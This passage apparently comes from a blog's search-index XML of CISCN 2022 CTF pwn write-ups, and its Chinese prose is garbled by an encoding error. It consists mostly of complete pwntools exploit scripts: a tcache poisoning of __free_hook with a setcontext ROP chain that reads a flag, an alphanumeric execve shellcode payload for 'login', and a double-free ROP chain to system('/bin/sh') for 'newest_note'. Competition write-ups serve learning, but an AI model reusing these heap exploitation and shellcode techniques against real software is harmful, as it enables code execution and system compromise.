class="hljs-number">0x1e0c61</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>op = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pt = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;op&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;rd&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;pt&#x27;</span>)<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;free_hook&#x27;</span>)<br>setcontext += <span class="hljs-number">61</span><br>lg(<span class="hljs-string">&#x27;setcontext&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>pop_rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span><br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span><br>magic = libc_base + <span class="hljs-number">0x000000000014a0a0</span><br>lg(<span class="hljs-string">&#x27;magic&#x27;</span>)<br><span class="hljs-comment"># mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>heap_base = <span class="hljs-built_in">next</span> &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><span class="hljs-comment"># change free_hook-&gt;magic</span><br>fake_next = <span class="hljs-built_in">next</span> ^ free_hook<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>pld = p64(magic)*<span class="hljs-number">2</span><br>edit(<span class="hljs-built_in">len</span>(pld), <span class="hljs-number">15</span>, pld)<br><br><span class="hljs-comment"># orw </span><br>flag_addr = heap_base + <span class="hljs-number">0x4c0</span><br>lg(<span class="hljs-string">&#x27;flag_addr&#x27;</span>)<br>owr = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)    <span class="hljs-comment"># push rcx-&gt;overflow p64(0)</span><br>owr += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(op)<br>owr += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_base + <span class="hljs-number">0x800</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(rd)<br>owr += p64(pop_rdi) + p64(heap_base + <span class="hljs-number">0x800</span>) +p64(pt)<br>edit(<span class="hljs-built_in">len</span>(owr), <span class="hljs-number">2</span>, owr)<br><br><span class="hljs-comment"># setcontext</span><br>dest = heap_base + <span class="hljs-number">0x5d0</span> - <span class="hljs-number">0x20</span><br>pld = p64(setcontext) + p64(dest)       <br>pld = pld.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pld += p64(flag_addr + <span class="hljs-number">0x10</span>)   <span class="hljs-comment"># rsp-&gt;orw</span><br>pld += p64(ret)     <span class="hljs-comment"># rcx-&gt;ret</span><br>edit(<span class="hljs-built_in">len</span>(pld), <span class="hljs-number">3</span>, pld)<br><span class="hljs-comment"># dbg()</span><br>delete(<span class="hljs-number">3</span>)<br><br>sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_competitionï¼šå¤§å“¥åˆ«å·æˆ‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 ciscn åˆèµ›</title>
    <link href="/2022/07/01/CTF_competition/2022ciscn/"/>
    <url>/2022/07/01/CTF_competition/2022ciscn/</url>
    
    <content type="html"><![CDATA[<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>ä¸»è¦æ˜¯å¯¹ç¨‹åºé€»è¾‘çš„åˆ†æå’Œå¯è§å­—ç¬¦çš„shellcodeçš„ç¼–å†™ï¼ŒåŒæ—¶è¦æ³¨æ„shellcodeçš„ç¼–å†™è§„åˆ™ï¼Œè¿™é‡Œæ˜¯ä½¿ç”¨<code>rdx</code>è¿›è¡Œè§¦å‘ã€‚</p><blockquote><p> å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/SmalOSnail/article/details/105236336">(8æ¡æ¶ˆæ¯) æ‰‹æŠŠæ‰‹æ•™ä½ å†™çº¯å­—ç¬¦ascii shellcodeâ€”â€”æœ€é€šä¿—æ˜“æ‡‚çš„alphanumeric shellcodeç”ŸæˆæŒ‡å—_TaQini852çš„åšå®¢-CSDNåšå®¢_ascii shellcode</a></p></blockquote><p>ä½¿ç”¨alpha3çš„åŸºæœ¬æ­¥éª¤ï¼š</p><ol><li><p>pythonè¿è¡Œä»¥ä¸‹è„šæœ¬ç”Ÿæˆshellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode_x64&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<span class="hljs-comment"># æ³¨æ„æ‰“å¼€çš„æ ¼å¼æ˜¯wb</span><br>payload = asm(shellcraft.sh())<span class="hljs-comment"># å¯ä»¥æ‰‹å†™</span><br>f.write(payload)<br>f.close()<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨å‘½ä»¤ç”Ÿæˆå¯è§å­—ç¬¦çš„shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 ./ALPHA3.py x64 ascii mixedcase rdx --input=&quot;shellcode_x64&quot;<br></code></pre></td></tr></table></figure></li></ol><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./login&#x27;</span>)<br><span class="hljs-comment"># sh = remote(&#x27;47.93.176.13&#x27;, 25792)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">TAYAXVI31VXPP[_Hc4:14:SX-&#125;/?w-x0An5C+&#123;(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-]oN&#125;-08/P5;W-vP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-!/o&gt;-uTX 5Xtp(P^14:WX-@``?-@??_-|``aP_Hc4:14:SX-~~/?-?!0,5GZ#SP^14:WX-@``?-@??_-|``aP_Hc4:14:SX-^;?&#125;-w&quot; Z5#!f8P^14:WX-@``?-@??_-|``aP_Hc4:14:SX- ?^;-@@~@5%@VlP^14:WX-@``?-@??_-|``aP_SX- h#F- 9^@5X_~yP_Hc4:14:SX-W?/6-!@  5wb 9P^14:WX-@``?-@??_-|``aP_SX-.1o_-0wpx5&gt;V (P^SX-@~~7-Maaw5k  QP_AAAA|4oGf6^@nww`SjMMkct?=/w!&#123;~?&quot;uJ-&#x27;(R6sF`VUmo&#125;r__#33Vavp~0tS&lt;ZTC?Q-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-comment"># ä½¿ç”¨ae64ç”Ÿæˆçš„shellcode</span><br><br>payload = <span class="hljs-string">&#x27;msg:ro0t\r\nopt:1\n\n&#x27;</span><br>sh.send(payload)<br>sh.recv()<br>payload = <span class="hljs-string">&#x27;msg:&#x27;</span> + shellcode + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;opt:2\n\n&#x27;</span><br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h2><p>é€šè¿‡æ•´å‹æº¢å‡ºä½¿å¾—åˆ†é…çš„å †å—å¤§å°å¤§äº<code>0x21000</code>ï¼Œæ­¤å †å—çš„æŒ‡é’ˆå°±ä¸libcå­˜åœ¨å›ºå®šçš„åç§»ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡showè¿™ä¸€ä¸ªåŠŸèƒ½æ¥æ³„éœ²libcçš„åœ°å€ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡å†…æŒ‡é’ˆå’Œenvironæ¥æ³„éœ²æ ˆåœ°å€ï¼Œæœ€åè¿›è¡Œropã€‚</p><blockquote><p>æ¯”èµ›ä¸­æ²¡èƒ½æƒ³åˆ°è¿™ä¸€ç‚¹ï¼Œå±æ˜¯æœ‰ç‚¹å¼±é¸¡â‰§ ï¹ â‰¦</p></blockquote><p><code>malloc(8*0x20005000)</code>ï¼Œå°†ä¼šå¾—åˆ°ä¸€ä¸ªä½äº.tlsæ®µä¸Šçš„æŒ‡é’ˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx <span class="hljs-variable">$rebase</span>(0x4190)</span><br>0x557505d22190: 0x00007fb40f836010      0x0000000020005000<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå°tipsï¼šå¯ä»¥é€šè¿‡pwndbgä¸­çš„searchå‘½ä»¤æ¥å¯»æ‰¾å†…æŒ‡é’ˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search</span><br>usage: search [-h] [-t &#123;byte,short,word,dword,qword,pointer,string,bytes&#125;] [-1] [-2] [-4] [-8] [-p] [-x] [-s] [-e]<br>              [-w] [--save] [--no-save] [-n]<br>              value [mapping_name]<br>search: error: the following arguments are required: value<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;environ</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (&lt;data variable, no debug info&gt; *) 0x7fb40fa82ec0 &lt;environ&gt;</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">search -p 0x7fb40fa82ec0</span><br>libc.so.6       0x7fb40fa79fb8 0x7fb40fa82ec0<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/2gx 0x7fb40fa82ec0</span><br>0x7fb40fa82ec0 &lt;environ&gt;:       0x00007ffd346f8448      0x0000000000000000<br></code></pre></td></tr></table></figure><p>é€šè¿‡double_freeä¿®æ”¹mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œæœ€åé€€å‡ºç¨‹åºå³å¯get_shellã€‚éœ€è¦æ³¨æ„è¿›è¡Œfake_chunkåˆ†é…çš„æ—¶å€™ï¼Œç›®æ ‡åœ°å€çš„ç¯å¢ƒæ˜¯å¦èƒ½æ»¡è¶³åˆ†é…æ¡ä»¶ã€‚</p><p>WPå¦‚ä¸‹ï¼š</p><blockquote><p>e4l4å¸ˆå‚…çš„æ¨¡æ¿è¿˜æ˜¯æŒºé¦™çš„(â—â€™â—¡â€™â—)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./newest_note&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./newest_note&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------#</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, data = <span class="hljs-string">&#x27;pursue&#x27;</span></span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br>sla(<span class="hljs-string">&quot;How many pages your notebook will be? :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20005000</span>)) <span class="hljs-comment"># str()ä¼šå°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºåè¿›åˆ¶çš„å­—ç¬¦ä¸²</span><br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0x4899a</span>)<br>libc_base = uu64() - <span class="hljs-number">0x218cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002e6c5</span><br>ret = libc_base + <span class="hljs-number">0x000000000002d9b9</span><br><br><span class="hljs-comment"># leak stack</span><br>show(<span class="hljs-number">0x487f5</span>)<br>stack_addr = uu64()<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i)  <span class="hljs-comment"># 0-9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(i)  <span class="hljs-comment"># 0-6</span><br><br><span class="hljs-comment"># leak heap</span><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;key&#x27;</span>)<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">7</span>)     <span class="hljs-comment"># double free</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i)<br><span class="hljs-comment"># dbg()</span><br>pld = p64((stack_addr - <span class="hljs-number">0x138</span>) ^ key)<br>add(<span class="hljs-number">0</span>, pld)<br>add(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>)<br>pld = p64(<span class="hljs-number">0</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>add(<span class="hljs-number">3</span>, pld)     <span class="hljs-comment"># change main_ret_address</span><br><br>sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)     <span class="hljs-comment"># exit</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="satool"><a href="#satool" class="headerlink" title="satool"></a>satool</h2><blockquote><p>æ‰¾äº†ä¸‰ç¯‡æ–‡ç« ï¼Œä¹‹åå¯èƒ½ä¼šè¿›è¡Œå…·ä½“çš„å­¦ä¹ ï¼š</p><p><a href="https://lakwsh.net/?p=457">CISCN 2022 åˆèµ› satool writeup â€“ æ•°å­—çš„ç§˜å¯†åŸºåœ° (lakwsh.net)</a></p><p>[<a href="https://bbs.pediy.com/thread-273119.htm">åŸåˆ›]LLVM PASSç±»pwné¢˜å…¥é—¨-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a></p><p><a href="https://blog.csdn.net/Vin_tt/article/details/118405231">(8æ¡æ¶ˆæ¯) Linuxç¯å¢ƒä¸‹LLVM + clangå®‰è£…_dididadidaaçš„åšå®¢-CSDNåšå®¢_linux llvm</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF_competitionï¼šå¤§å“¥åˆ«å·æˆ‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
